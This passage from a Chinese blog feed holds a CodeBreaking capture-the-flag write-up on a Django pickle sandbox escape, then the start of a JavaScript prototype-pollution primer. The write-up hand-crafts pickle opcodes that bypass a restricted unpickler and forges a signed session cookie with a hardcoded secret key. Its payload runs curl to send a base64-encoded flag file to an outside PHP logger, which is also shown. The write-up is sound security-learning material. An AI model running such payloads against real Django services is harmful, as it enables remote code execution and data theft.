<code>eval</code> 函数，再执行 <code>eval</code> 函数，这实际上是两步，而我们常用 <code>__reduce__</code> 生成的序列化字符串，只能执行一个函数，这就产生矛盾了，所以就要放弃 <code>__reduce__</code> 直接手写 pickle 代码</p></li><li><p>pickle 是一种堆栈语言，它没有变量名这个概念，pickle 的内容存储在 stack(栈) 和 memo(存储信息的列表) 中。首先将 payload <code>b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;</code> 写进一个文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'whoami'</span>,))</span><br><span class="line"></span><br><span class="line">person = Person()</span><br><span class="line">f = open(<span class="string">'pickle'</span>,<span class="string">'wb'</span>)</span><br><span class="line">pickle.dump(person ,f, protocol = <span class="number">0</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></li><li><p>执行 <code>python -m pickletools pickle</code> 对其分析，得到一堆操作指令(opcode)</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_4.png" alt></p></li><li><p>阅读源码可以获得所有的 opcodes</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_5.png" alt></p></li><li><p>这段 pickle 代码所涉及到的部分符号意思如下 : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c : 引入模块和对象，模块名和对象名以换行符分割。（find_class校验就在这一步，也就是说，只要c这个OPCODE的参数没有被find_class限制，其他地方获取的对象就不会被沙盒影响了，这也是为什么要用getattr来获取对象）</span><br><span class="line">p : 将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</span><br><span class="line">( : 压入一个标志到栈中，表示元组的开始位置</span><br><span class="line">V : 向栈中压入一个(unicode)字符串</span><br><span class="line">t : 从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</span><br><span class="line">R : 从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</span><br><span class="line">. : 表示整个程序结束</span><br></pre></td></tr></table></figure></li><li><p>那么这段 pickle 就很容易懂了</p><figure class="highlight plain"><figcaption><span>language</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00: c    GLOBAL     &apos;nt system&apos; # 向栈顶压入 &apos;nt.system&apos; 这个可执行对象</span><br><span class="line">11: p    PUT        0 # 将这个对象存储到 memo 的第 0 个位置</span><br><span class="line">14: (    MARK # 压入一个元组的开始标志</span><br><span class="line">15: V        UNICODE    &apos;whoami&apos; # 压入字符串&apos;whoami&apos;</span><br><span class="line">23: p        PUT        1 # 将这个字符串存储到 memo 的第 1 个位置</span><br><span class="line">26: t        TUPLE      (MARK at 14) # 将由刚压入栈中的字符串弹出，再将由这个字符串组成的元组压入栈中</span><br><span class="line">27: p    PUT        2 # 将这个元组存储到 memo 的第 2 个位置</span><br><span class="line">30: R    REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，这里即为 &apos;nt.system(&apos;whoami&apos;)&apos; ，将结果压入栈中</span><br><span class="line">31: p    PUT        3 # 将栈顶的元素(也就是刚才执行的结果)存储到 memo 的第 3 个位置</span><br><span class="line">34: .    STOP # 程序结束</span><br></pre></td></tr></table></figure></li><li><p>简化为如下代码，memo 没有起到太大作用，但这段代码仍然可以执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nt</span><br><span class="line">system</span><br><span class="line">(Vwhoami</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure></li><li><p>接着开始写 pickle 代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins # 将 builtins 设为可执行对象</span><br><span class="line">getattr # 获取 getattr 方法</span><br><span class="line">(cbuiltins # 压入元组开始标志，并将 builtins 设为可执行对象</span><br><span class="line">dict # 获取 dict 对象</span><br><span class="line">S&apos;get&apos; # 压入字符串 &apos;get&apos;</span><br><span class="line">tR(cbuiltins # 弹出 builtins.dict,get 并组成新的元组压入栈中。然后执行 builtins.getattr(builtins.dict,get) 得到 get 方法压入栈中。再压入元组标志，将 builtins 设为可执行对象</span><br><span class="line">globals # 获取 builtins.globals</span><br><span class="line">(tRS&apos;builtins&apos; # 压入元组标志，执行 builtins.globals，然后压入字符串 &apos;builtins&apos;</span><br><span class="line">tRp1 # 执行 get(builtins)，获取到 builtins 对象存储到 memo[1] 处</span><br></pre></td></tr></table></figure></li><li><p>python 代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">data = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">.'''</span></span><br><span class="line"></span><br><span class="line">data = pickle.loads(data)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"><span class="comment"># &lt;module 'builtins' (built-in)&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>然后利用这个没有限制的 <code>builtins</code> 对象获取危险函数，并执行，这就绕过了沙盒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins # 将 builtins 设为可执行对象</span><br><span class="line">getattr # 获取 getattr 方法</span><br><span class="line">(g1 # 压入数组，压入上一步获取的 builtins 对象</span><br><span class="line">S&apos;eval&apos; # 压入字符串 &apos;eval&apos;</span><br><span class="line">tR(S&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; # 获取到 eval 函数。将字符串 &apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; 压入</span><br><span class="line">tR. # 执行 eval(&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos;)</span><br></pre></td></tr></table></figure></li><li><p>上面都是绕过的分析，看一下本题有哪些可控点，考虑 <code>SESSIONID</code> ，接下来就看一下源码中对于它的操作</p></li><li><p>它使用的是 <code>django.contrib.sessions.backends.signed_cookies</code> 直接导入</p></li><li><p>python 代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">blacklist = &#123;<span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line"><span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line"><span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line"><span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line"><span class="comment"># Forbid everything else.</span></span><br><span class="line"><span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line"><span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">data = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S'eval'</span></span><br><span class="line"><span class="string">tR(S'__import__("os").system("id")'</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">.'''</span></span><br><span class="line"></span><br><span class="line">data = restricted_loads(data)</span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_6.png" alt></p></li><li><p>本题的 exp 如下，由于在同一个局域网就在物理机上写了一个接收的 php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins,io</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">data = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S'eval'</span></span><br><span class="line"><span class="string">tR(S'__import__("os").system("curl http://192.168.0.100/xss/xss.php?$(cat /flag_djang0_p1ckle | base64)")'</span></span><br><span class="line"><span class="string">tR</span></span><br><span class="line"><span class="string">.'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64_encode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(s).strip(<span class="string">b'='</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pickle_exp</span><span class="params">(SECRET_KEY)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    is_compressed = <span class="literal">False</span></span><br><span class="line">    compress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> compress:</span><br><span class="line">        <span class="comment"># Avoid zlib dependency unless compress is being used</span></span><br><span class="line">        compressed = zlib.compress(data)</span><br><span class="line">        <span class="keyword">if</span> len(compressed) &lt; (len(data) - <span class="number">1</span>):</span><br><span class="line">            data = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">    base64d = b64_encode(data).decode()</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">'.'</span> + base64d</span><br><span class="line">    SECRET_KEY = SECRET_KEY</span><br><span class="line">    <span class="comment"># 根据SECRET_KEY进行Cookie的制造</span></span><br><span class="line">    session = signing.TimestampSigner(key = SECRET_KEY,salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>).sign(base64d)</span><br><span class="line">    print(session)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    SECRET_KEY = <span class="string">'zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm'</span></span><br><span class="line">    pickle_exp(SECRET_KEY)</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_7.png" alt></p></li><li><p>xss.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = fopen(<span class="string">"cookies.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key=&gt;$value) </span><br><span class="line">&#123;</span><br><span class="line">fwrite($data, $key.<span class="string">":"</span>.$value);</span><br><span class="line">fwrite($data, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="thejs"><a href="#thejs" class="headerlink" title="thejs"></a>thejs</h1><ul><li>JS 原型污染，没找到对应源码</li><li><a href="https://bbs.pediy.com/thread-249643.htm" target="_blank" rel="noopener">Node.js原型污染攻击的分析与利用</a></li><li><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">深入理解JavaScript Prototype污染攻击</a></li><li><a href="https://www.codercto.com/a/41487.html" target="_blank" rel="noopener">一个题解</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CodeBreaking : &lt;a href=&quot;https://code-breaking.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://code-breaking.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在线正则表达式匹配 : &lt;a href=&quot;https://regex101.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://regex101.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;根据已有的大佬们的 wp 对 code breaking 做的一个复现，很多内容都是第一次接触，对涉及到的知识点做些总结和拓展。&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="CodeBreaking" scheme="http://yoursite.com/tags/CodeBreaking/"/>
    
  </entry>
  
  <entry>
    <title>JS 原型污染</title>
    <link href="http://yoursite.com/2019/09/14/JS%20%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/"/>
    <id>http://yoursite.com/2019/09/14/JS 原型污染/</id>
    <published>2019-09-14T08:43:10.243Z</published>
    <updated>2019-09-14T08:42:28.401Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到好多原型污染的题目，又没有学过，做一个总结。</p><p>原文 : <a href="https://bbs.pediy.com/thread-249643.htm" target="_blank" rel="noopener">Node.js原型污染攻击的分析与利用</a> and <a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">深入理解JavaScript Prototype污染攻击</a></p><a id="more"></a><h1 id="JavaScript-中的对象"><a href="#JavaScript-中的对象" class="headerlink" title="JavaScript 中的对象"></a>JavaScript 中的对象</h1><ul><li><p>JavaScript 中的对象就是 key 和 value 的映射关系，就相当于 python 中的 <code>dict</code> ，比如有如下代码 : </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = &#123;<span class="attr">name</span>:<span class="string">"peri0d"</span>, <span class="attr">age</span>:<span class="string">"19"</span>&#125;;</span><br><span class="line">s.name;     <span class="comment">// print "peri0d"</span></span><br><span class="line">s.age;    <span class="comment">// print "19"</span></span><br><span class="line"><span class="keyword">typeof</span>(s);  <span class="comment">// print "object"</span></span><br><span class="line"><span class="built_in">console</span>.log(s);</span><br><span class="line"><span class="comment">// print Object &#123; name: "peri0d", age: "19" &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(s.prototype);</span><br><span class="line"><span class="comment">// print undefined</span></span><br></pre></td></tr></table></figure></li><li><p>如果执行 <code>console.log(s)</code> 将会返回如下信息，可以看到很多属性和方法都包含在 <code>prototype</code> 中，这些多余的信息全部来自于 JavaScript 中的 <code>Object</code> 对象，这和 python 中 <code>Object</code> 是所有类的父类一个道理</p><p>  <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/JavaScript/js_1.png" alt></p></li><li><p>JavaScript 中的所有对象都是通过 <code>Object</code> 对象建立的。它的构造函数为给定值创建一个对象包装器。如果给定值是 <code>null</code> 或 <code>undefined</code>，将会创建并返回一个空对象，否则，将返回一个与给定值对应类型的对象。当以非构造函数形式被调用时，<code>Object</code> 等同于 <code>new Object()</code> 。以如下代码为例来说明</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// print an empty object </span></span><br><span class="line"><span class="keyword">typeof</span>(test);</span><br><span class="line"><span class="comment">// print "object"</span></span><br><span class="line"><span class="built_in">console</span>.log(test.prototype);</span><br><span class="line"><span class="comment">// print undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(test);</span><br><span class="line"><span class="comment">// print the whole object and all its attributes</span></span><br><span class="line"><span class="comment">// print Object &#123;  &#125;</span></span><br><span class="line"></span><br><span class="line">test2 = <span class="built_in">Object</span>.create(<span class="built_in">String</span>);</span><br><span class="line"><span class="keyword">typeof</span>(test2);</span><br><span class="line"><span class="comment">// print "object"</span></span><br><span class="line"><span class="built_in">console</span>.log(test2..prototype);</span><br><span class="line"><span class="comment">// print String &#123; "" &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(test2);</span><br></pre></td></tr></table></figure><p>  <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/JavaScript/js_2.png" alt></p></li><li><p>JavaScript 中没有绝对的函数和类的概念，函数本身作为类的构造函数</p><ol><li><p>在函数被创建的时候，它被添加了一个 <code>prototype</code> 属性，而普通的数据类型则没有。这个属性是一个对象(原型对象)且默认有一个 <code>constructor</code> 属性，该属性指向一个函数，在这个函数中，原型对象也是一个属性。</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/JavaScript/js_3.png" alt></p></li><li><p>在对象被创建的时候，它被添加了一个 <code>__proto__</code> 属性到新创建的对象中，这一属性指向构造函数的原型对象</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/JavaScript/js_4.png" alt></p></li><li><p><code>object.__proto__</code> 指向 <code>function.prototype</code> </p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">person</span><span class="params">(fullName, age)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.fullName = fullName;</span><br><span class="line">    <span class="keyword">this</span>.details = function()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.fullName+<span class="string">" has age: "</span>+<span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(person.prototype);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;constructor: ƒ&#125;</span></span><br><span class="line"><span class="comment">constructor: ƒ person(fullName, age)</span></span><br><span class="line"><span class="comment">__proto__: Object</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> person(<span class="string">"Alice"</span>, <span class="number">22</span>);</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> person(<span class="string">"Bob"</span>, <span class="number">20</span>);</span><br><span class="line">console.log(person1);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">person &#123;age: 20, fullName: "Bob", details: ƒ&#125;</span></span><br><span class="line"><span class="comment">    age: 20</span></span><br><span class="line"><span class="comment">    details: ƒ ()</span></span><br><span class="line"><span class="comment">    fullName: "Bob"</span></span><br><span class="line"><span class="comment">    __proto__:</span></span><br><span class="line"><span class="comment">    constructor: ƒ person(fullName, age)</span></span><br><span class="line"><span class="comment">    arguments: null</span></span><br><span class="line"><span class="comment">    caller: null</span></span><br><span class="line"><span class="comment">    length: 2</span></span><br><span class="line"><span class="comment">    name: "person"</span></span><br><span class="line"><span class="comment">    prototype: &#123;constructor: ƒ&#125;</span></span><br><span class="line"><span class="comment">    __proto__: ƒ ()</span></span><br><span class="line"><span class="comment">    [[FunctionLocation]]: VM672:1</span></span><br><span class="line"><span class="comment">    [[Scopes]]: Scopes[1]</span></span><br><span class="line"><span class="comment">    __proto__: Object</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">person1.details();</span><br><span class="line"><span class="comment">// print "Bob has age: 20"</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="prototype-属性与-proto-属性"><a href="#prototype-属性与-proto-属性" class="headerlink" title="prototype 属性与 __proto__ 属性"></a>prototype 属性与 __proto__ 属性</h1><ul><li><p>原型 <code>prototype</code> 是类的一个属性，而所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"peri0d"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test1 = <span class="keyword">new</span> test();</span><br><span class="line">test1.show();</span><br><span class="line"><span class="comment">// print "peri0d"</span></span><br></pre></td></tr></table></figure></li><li><p>一个类实例化出的属性可以通过 <code>__proto__</code> 来访问类的原型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test1.__proto__ == test.prototype</span><br><span class="line"><span class="comment">// print true</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="constructor-属性"><a href="#constructor-属性" class="headerlink" title="constructor 属性"></a>constructor 属性</h1><ul><li><p>它返回创建实例对象的 <code>Object</code> 构造函数的引用，即返回用于创建这个对象的函数。注意，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串</p></li><li><p>举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.color = <span class="string">"yellow"</span>;</span><br><span class="line">    <span class="keyword">this</span>.showColor = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.color;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span 